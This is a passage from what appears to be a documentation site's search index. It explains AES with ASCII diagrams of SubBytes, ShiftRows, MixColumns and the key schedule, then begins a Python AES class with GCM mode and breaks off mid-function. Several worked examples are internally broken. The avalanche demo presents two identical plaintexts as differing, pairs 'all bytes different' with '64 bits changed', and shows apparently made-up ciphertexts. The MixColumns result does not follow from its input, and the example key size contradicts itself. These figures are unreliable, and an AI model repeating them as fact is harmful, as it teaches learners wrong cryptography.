Secret/Future\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSecurity Level:\nAES-128: 2^128 possible keys (unbreakable with current tech)\nAES-256: 2^256 possible keys (quantum-resistant)\n</code></pre></p> <p>Advantages: - \u2705 Extremely Secure: No practical attacks on full AES - \u2705 Fast: Hardware acceleration (AES-NI instructions) - \u2705 Flexible: Multiple key sizes - \u2705 Efficient: Low memory and CPU usage - \u2705 Widely Adopted: Industry standard - \u2705 Government Approved: NSA Suite B - \u2705 Well Studied: Analyzed for over 20 years</p> <p>Performance Comparison: <pre><code>Encryption Speed (MB/s on modern CPU):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nDES:         50 MB/s\n3DES:        20 MB/s\nAES-128:    500 MB/s (without AES-NI)\nAES-128:  3,000 MB/s (with AES-NI)\n\nAES is 10-150x faster than 3DES!\n</code></pre></p>"},{"location":"security/encryption/#how-aes-works-step-by-step","title":"How AES Works: Step-by-Step","text":"<p>AES processes data through multiple rounds of transformations. Let's understand each operation in detail:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            AES DETAILED ENCRYPTION PROCESS                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nEXAMPLE: AES-128 (10 rounds)\n\nINPUT PLAINTEXT: \"Hello World 123!\" (16 bytes)\nKEY: 256-bit key (we'll use 128-bit for simplicity)\n\nSTEP 1: Convert to State Matrix (4\u00d74 bytes)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nInput bytes arranged column-wise:\n\n        Col0  Col1  Col2  Col3\n     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\nRow0 \u2502  H     W     d     3    \u2502\nRow1 \u2502  e     o     (space)!   \u2502\nRow2 \u2502  l     r     1          \u2502\nRow3 \u2502  l     l     2          \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nHex representation:\n     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n     \u2502 48   57   64   33       \u2502\n     \u2502 65   6F   20   21       \u2502\n     \u2502 6C   72   31           \u2502\n     \u2502 6C   6C   32           \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nROUND 0: Initial AddRoundKey\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nState \u2295 RoundKey[0]\n\nBefore:              RoundKey[0]:      After (State):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 48 57 .. \u2502    \u2295    \u2502 2B 7E .. \u2502  =   \u2502 63 29 .. \u2502\n\u2502 65 6F .. \u2502         \u2502 28 AE .. \u2502      \u2502 4D C1 .. \u2502\n\u2502 6C 72 .. \u2502         \u2502 D2 A6 .. \u2502      \u2502 BE D4 .. \u2502\n\u2502 6C 6C .. \u2502         \u2502 AB F7 .. \u2502      \u2502 C7 9B .. \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nROUND 1-9: Main Rounds (each has 4 operations)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 OPERATION 1: SubBytes (Byte Substitution)                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nEach byte replaced using S-box lookup table (non-linear substitution)\n\nS-BOX (partial):\n    0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F\n  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n0 \u2502 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76\n1 \u2502 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0\n...\n\nExample:\nInput byte:  0x53\nRow = 5, Col = 3\nS-box[5][3] = 0xED\nOutput byte: 0xED\n\nBefore SubBytes:        After SubBytes:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 63 29 .. \u2502  S-box     \u2502 FB 7D .. \u2502\n\u2502 4D C1 .. \u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u25b6   \u2502 E4 8E .. \u2502\n\u2502 BE D4 .. \u2502            \u2502 23 AF .. \u2502\n\u2502 C7 9B .. \u2502            \u2502 0C C5 .. \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n      \u2502                       \u2502\n      \u2514\u2500\u2500\u2500\u2500 Non-linear \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           confusion\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 OPERATION 2: ShiftRows (Row Permutation)                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCircular left shift of rows (provides diffusion)\n\nBefore ShiftRows:              After ShiftRows:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510               \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a0 a1 a2 a3  \u2502 Row 0: No     \u2502 a0 a1 a2 a3  \u2502\n\u2502 b0 b1 b2 b3  \u2502 Row 1: &lt;&lt;1    \u2502 b1 b2 b3 b0  \u2502\n\u2502 c0 c1 c2 c3  \u2502 Row 2: &lt;&lt;2    \u2502 c2 c3 c0 c1  \u2502\n\u2502 d0 d1 d2 d3  \u2502 Row 3: &lt;&lt;3    \u2502 d3 d0 d1 d2  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518               \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nVisual:\nRow 1: [b0, b1, b2, b3] \u2192 [b1, b2, b3, b0]\n       \u2514\u2500\u2500\u2500\u2518 shifted left by 1\n\nRow 2: [c0, c1, c2, c3] \u2192 [c2, c3, c0, c1]\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518 shifted left by 2\n\nRow 3: [d0, d1, d2, d3] \u2192 [d3, d0, d1, d2]\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 shifted left by 3\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 OPERATION 3: MixColumns (Column Mixing)                     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nMatrix multiplication in Galois Field GF(2^8)\nEach column multiplied by fixed matrix\n\nMixColumns Matrix:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 02 03 01 01\u2502 \u2502 s0,c     \u2502 \u2502 s'0,c    \u2502\n\u2502 01 02 03 01\u2502 \u2502 s1,c     \u2502 \u2502 s'1,c    \u2502\n\u2502 01 01 02 03\u2502 \u00d7 \u2502 s2,c     \u2502 = \u2502 s'2,c    \u2502\n\u2502 03 01 01 02\u2502 \u2502 s3,c     \u2502 \u2502 s'3,c    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nExample for one column:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2510\n\u2502 02 03 01 01\u2502 \u2502 DB \u2502 \u2502 8E \u2502\n\u2502 01 02 03 01\u2502 \u2502 13 \u2502 \u2502 9F \u2502\n\u2502 01 01 02 03\u2502 \u00d7 \u2502 53 \u2502 = \u2502 D4 \u2502\n\u2502 03 01 01 02\u2502 \u2502 45 \u2502 \u2502 17 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2518\n\nThis spreads each byte across entire column\n(Maximum diffusion)\n\nBefore MixColumns:        After MixColumns:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a0 b0 c0 d0\u2502             \u2502 a'0 b'0 c'0 d'0\u2502\n\u2502 a1 b1 c1 d1\u2502  Matrix     \u2502 a'1 b'1 c'1 d'1\u2502\n\u2502 a2 b2 c2 d2\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u25b6    \u2502 a'2 b'2 c'2 d'2\u2502\n\u2502 a3 b3 c3 d3\u2502             \u2502 a'3 b'3 c'3 d'3\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nEach output byte depends on all 4 input bytes of column!\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 OPERATION 4: AddRoundKey (XOR with Round Key)               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nXOR state with round-specific key\n\nState:                  RoundKey[i]:        Result:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a0 b0 .. \u2502      \u2295     \u2502 k0 l0 .. \u2502    =   \u2502 a0\u2295k0 .. \u2502\n\u2502 a1 b1 .. \u2502            \u2502 k1 l1 .. \u2502        \u2502 a1\u2295k1 .. \u2502\n\u2502 a2 b2 .. \u2502            \u2502 k2 l2 .. \u2502        \u2502 a2\u2295k2 .. \u2502\n\u2502 a3 b3 .. \u2502            \u2502 k3 l3 .. \u2502        \u2502 a3\u2295k3 .. \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nCOMPLETE ROUND VISUALIZATION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nInput State\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 SubBytes \u2502  Non-linear substitution (confusion)\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502ShiftRows \u2502  Transpose rows (diffusion)\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502MixColumns\u2502  Mix columns (diffusion) [Not in final round]\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502AddRndKey \u2502  XOR with round key\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u25bc\nOutput State (input to next round)\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nROUND 10: Final Round (No MixColumns)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. SubBytes\n2. ShiftRows\n3. AddRoundKey  \u2190 Final round key\n\nFinal State \u2192 CIPHERTEXT (16 bytes)\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nKEY SCHEDULE (Round Key Generation):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nOriginal Key (128-bit):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 K0  K1  K2  K3  K4  K5 ...  K14  K15  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nExpand to 11 round keys (44 words):\nRoundKey[0]:  w[0]  w[1]  w[2]  w[3]\nRoundKey[1]:  w[4]  w[5]  w[6]  w[7]\nRoundKey[2]:  w[8]  w[9]  w[10] w[11]\n...\nRoundKey[10]: w[40] w[41] w[42] w[43]\n\nKey expansion uses:\n- RotWord: Circular byte rotation\n- SubWord: S-box substitution  \n- Rcon: Round constant XOR\n\nExample:\nw[i] = w[i-4] \u2295 T(w[i-1])\nwhere T() = SubWord(RotWord(w)) \u2295 Rcon[i]\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nWHY AES IS SECURE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. CONFUSION (SubBytes):\n   Changes in plaintext/key produce complex changes in ciphertext\n   Non-linear S-box prevents mathematical analysis\n\n2. DIFFUSION (ShiftRows + MixColumns):\n   Each plaintext bit affects many ciphertext bits\n   After 2 rounds: 1 bit affects all 128 bits!\n\n3. KEY MIXING (AddRoundKey):\n   Different key for each round\n   Prevents key recovery attacks\n\n4. MULTIPLE ROUNDS:\n   10/12/14 rounds ensure complete diffusion\n   Avalanche effect: changing 1 input bit flips ~50% output bits\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nAVALANCHE EFFECT DEMONSTRATION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nPlaintext 1: \"Hello World!!!!\"\nPlaintext 2: \"Hello World!!!!\" (last char changed to '?')\n                            \u2191 Only 1 bit different\n\nAfter AES-128 encryption with same key:\n\nCiphertext 1: A7 3B F2 8C 91 5D E4 2A 8F 1C 37 6B D9 E8 4F 5C\nCiphertext 2: 2D C9 8A 41 6F E3 B7 9D 53 A8 C2 1F 84 6E D5 29\n              \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191 \u2191\u2191\n              All bytes completely different!\n\n64 bits out of 128 changed \u2192 Perfect avalanche!\n</code></pre>"},{"location":"security/encryption/#aes-implementation-example","title":"AES Implementation Example","text":"<p>Complete AES Implementation with All Modes:</p> <pre><code>from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Util.Padding import pad, unpad\nimport os\n\nclass AESCipher:\n    \"\"\"\n    Complete AES implementation with multiple modes\n    Demonstrates all common AES modes of operation\n    \"\"\"\n\n    def __init__(self, key: bytes = None):\n        \"\"\"\n        Initialize AES cipher\n        key: 16, 24, or 32 bytes for AES-128, AES-192, or AES-256\n        \"\"\"\n        if key is None:\n            # Generate random 256-bit key\n            self.key = get_random_bytes(32)\n        else:\n            if len(key) not in [16, 24, 32]:\n                raise ValueError(\"Key must be 16, 24, or 32 bytes\")\n            self.key = key\n\n        self.block_size = AES.block_size  # 16 bytes\n\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n    # MODE 1: GCM (Galois/Counter Mode) - RECOMMENDED\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n    def encrypt_gcm(self, plaintext: bytes) -&gt; dict:\n        \"\"\"\n        Encrypt using AES-GCM (Authenticated Encryption)\n\n        Advantages:\n        \u2705 Encryption + Authentication in one step\n        \u2705 Detects tampering\n        \u2705 Fast (parallelizable)\n        \u2705 No padding needed\n\n        Returns: dict with ciphertext, nonce, and tag\n        \"\"\"\n        # Create cipher in GCM mode\n        cipher = AES.new(self.key, AES.MODE_GCM)\n\n        # Encrypt and generate authentication tag\n        ciphertext, tag = cipher.encrypt_and_digest(plaintext)\n\n        return {\n            'ciphertext': ciphertext,\n            'nonce': cipher.nonce,  # 16 bytes, must be unique\n            'tag': tag              # 16 bytes authentication tag\n        }\n\n    def decrypt_gcm(self, ciphertext: bytes, nonce: bytes, tag: bytes) -&gt; bytes:\n        \"\"\"\n        Decrypt and verify AES-GCM\n        Raises ValueError if authentication fails (tampered data)\n        \"\"\"\n        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)\n\n        